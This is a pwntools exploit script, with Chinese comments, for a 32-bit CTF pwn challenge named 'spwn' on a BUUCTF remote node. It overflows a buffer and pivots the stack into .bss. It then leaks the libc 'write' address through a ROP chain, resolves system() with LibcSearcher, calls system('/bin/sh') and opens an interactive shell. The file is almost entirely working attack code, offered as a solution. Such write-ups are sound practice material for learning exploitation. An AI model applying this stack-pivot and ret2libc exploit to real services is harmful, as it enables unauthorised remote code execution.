# -*- coding: utf-8 -*-
from LibcSearcher import *
from PwnContext.core import *
binary = './spwn'
debug_libc = './libc-2.23.so'
elf = ELF(binary)
libc = ELF(debug_libc)
local = 1

if local == 1 :
    p = remote("node3.buuoj.cn","29836")
else:
    ctx.binary = binary
    ctx.remote_libc = debug_libc
    ctx.debug_remote_libc = True
    p = ctx.start()
#gdb.attach(p,'b *0x8048511\n')
puts_got = elf.got["puts"]
p.sendafter("name?",p32(0x8048380)+p32(0x8048513)+p32(0x1)+p32(0x804a01C)+p32(0x4))  #p32(0x8048513)
p.sendafter("say?","A"*0x18+p32(0x804A300-0x4)+p32(0x8048511))
# 注意栈迁移迁过去，eip会跟着变的


leak_addr =u32(p.recv(4))
print "leak" + hex(leak_addr)
libc=LibcSearcher('write',leak_addr)
libc_base=leak_addr- libc.dump("write") #libc.dump('write')
print "libc_base:" + hex(libc_base)
system_addr=libc_base+ libc.dump('system')
#gdb.attach(p,'b *0x8048511\n')


p.sendafter("name?",p32(system_addr)+"CCCC"+p32(0x804A30C)+"/bin/sh\x00")
p.sendafter("say?","A"*0x18+p32(0x804A300-0x4)+p32(0x8048511))
p.interactive()

# 0x1 直接将retaddress 覆盖为 leave retn
# 因为执行两个leave retn 之后根据ebp的取值调整栈
# 0x2 将ebp 覆盖为想要调整的位置-0x4即可(32位)
# 注意x32栈空间布置 ebp——函数地址——返还位置——参数——参数
# x64 用rop也一样可以栈迁移
